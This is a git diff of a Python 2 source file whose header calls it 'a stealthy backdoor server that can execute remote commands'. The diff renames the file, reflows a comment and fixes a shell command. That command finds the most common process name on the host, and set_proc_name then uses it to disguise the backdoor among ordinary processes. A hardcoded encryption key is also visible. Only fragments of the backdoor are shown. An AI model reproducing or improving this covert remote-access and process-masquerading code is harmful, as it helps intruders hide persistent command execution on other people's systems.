@@ -1,5 +1,5 @@
 ############################################################################################################
-##	SOURCE FILE:		backdoor.py - A stealthy backdoor server that can execute remote commands
+##	SOURCE FILE:		final_backdoor.py - A stealthy backdoor server that can execute remote commands
 ##
 ##	PROGRAM:		    backdoor
 ##
@@ -18,7 +18,7 @@
 ##
 ##  OUTPUT: commands/data is printed to standard out to easily see what is happening while testing.
 ##
-##	USAGE: python backdoor.py
+##	USAGE: python final_backdoor.py
 ##
 ##############################################################################################################
 
@@ -52,7 +52,8 @@ ENCRYPTION_KEY = "zdehjk"
 ##
 ##				    data:   The payload of the packet sent from the client that contains the
 ##                          command to execute
-##                  ENCRYPTION_KEY:    The encryption ENCRYPTION_KEY. Defaults to the user-defined variable ENCRYPTION_KEY
+##                  ENCRYPTION_KEY:    The encryption ENCRYPTION_KEY.
+##                                     Defaults to the user-defined variable ENCRYPTION_KEY
 ##                  encode: When true, encrypt the data. Default is False.
 ##                  decode: When true, decode the data. Default is False.
 ##
@@ -137,7 +138,7 @@ def set_proc_name(newname):
 print FILTER
 
 # Gets the most common process name for ps -aux/htop
-command = os.popen(ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}')
+command = os.popen("ps -aux | awk '{ print $11 }' | sort | uniq -c | sort -n | tail -n1 | awk '{ print $2}'")
 command_result = command.read()
 print "The most common process for ps/htop is: {0} \n".format(command_result)
 
